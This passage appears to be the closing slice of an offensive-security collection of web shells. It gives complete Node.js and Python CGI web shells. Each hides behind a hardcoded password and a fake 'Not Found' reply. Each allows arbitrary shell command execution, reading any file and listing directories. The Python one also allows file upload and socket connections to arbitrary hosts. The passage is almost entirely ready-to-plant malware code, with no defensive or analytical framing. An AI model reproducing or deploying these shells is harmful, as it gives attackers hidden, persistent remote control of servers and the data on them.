### 3.6 Node.js WebShell

```javascript
const http = require('http');
const { exec } = require('child_process');
const fs = require('fs');
const crypto = require('crypto');

const PASS = 'admin2026';
const PORT = process.env.PORT || 4444;

http.createServer((req, res) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        const params = new URLSearchParams(body);
        const pass = params.get('pass');

        if (pass !== PASS) {
            res.writeHead(404);
            res.end('Not Found');
            return;
        }

        const action = params.get('a');
        const data = params.get('d');

        switch (action) {
            case 'cmd':
                exec(data, (err, stdout, stderr) => {
                    res.writeHead(200, {'Content-Type': 'text/html'});
                    res.end('<pre>' + stdout + stderr + '</pre>');
                });
                break;
            case 'read':
                fs.readFile(data, 'utf8', (err, content) => {
                    res.end('<pre>' + (err ? err.message : content) + '</pre>');
                });
                break;
            case 'ls':
                fs.readdir(data || '.', (err, files) => {
                    res.end(files.join('<br>'));
                });
                break;
            default:
                res.end('<h1>Node.js Shell</h1>' +
                    '<p>PID: ' + process.pid + '</p>' +
                    '<p>Node: ' + process.version + '</p>' +
                    '<p>CWD: ' + process.cwd() + '</p>');
        }
    });
}).listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
```

### 3.7 Python CGI WebShell

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import cgi
import subprocess
import os
import base64
import sys

PASS = 'admin2026'

def main():
    print("Content-Type: text/html; charset=utf-8\n")
    form = cgi.FieldStorage()

    if form.getvalue('pass') != PASS:
        print("Not Found")
        return

    action = form.getvalue('a', '')
    data = form.getvalue('d', '')

    if action == 'cmd':
        try:
            result = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, timeout=30)
            print("<pre>" + result.decode('utf-8', errors='replace') + "</pre>")
        except subprocess.TimeoutExpired:
            print("<pre>Command timed out</pre>")
        except Exception as e:
            print("<pre>Error: " + str(e) + "</pre>")

    elif action == 'read':
        try:
            with open(data, 'r') as f:
                print("<pre>" + f.read() + "</pre>")
        except Exception as e:
            print("Error: " + str(e))

    elif action == 'ls':
        try:
            files = os.listdir(data or '.')
            for f in files:
                path = os.path.join(data or '.', f)
                prefix = '[D]' if os.path.isdir(path) else '[F]'
                size = os.path.getsize(path) if os.path.isfile(path) else 0
                print(f"{prefix} {f} ({size} bytes)<br>")
        except Exception as e:
            print("Error: " + str(e))

    elif action == 'upload':
        fileitem = form['file']
        if fileitem.filename:
            with open(data, 'wb') as f:
                f.write(fileitem.file.read())
            print("Uploaded: " + data)

    elif action == 'proxy':
        # Reverse proxy / port forward via Python
        import socket
        try:
            host, port = data.split(':')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.send(b'GET / HTTP/1.0\r\n\r\n')
            resp = s.recv(4096)
            s.close()
            print("<pre>" + resp.decode('utf-8', errors='replace') + "</pre>")
        except Exception as e:
            print("Error: " + str(e))

    else:
        print("<h1>Python CGI WebShell</h1>")
        print("<p>Python: " + sys.version + "</p>")
        print("<p>OS: " + os.name + "</p>")
        print("<p>User: " + os.environ.get('USER', 'unknown') + "</p>")
        print("<p>CWD: " + os.getcwd() + "</p>")

if __name__ == '__main__':
    main()
```

---



---
📖 本切片 4/4 结束。 本章节结束。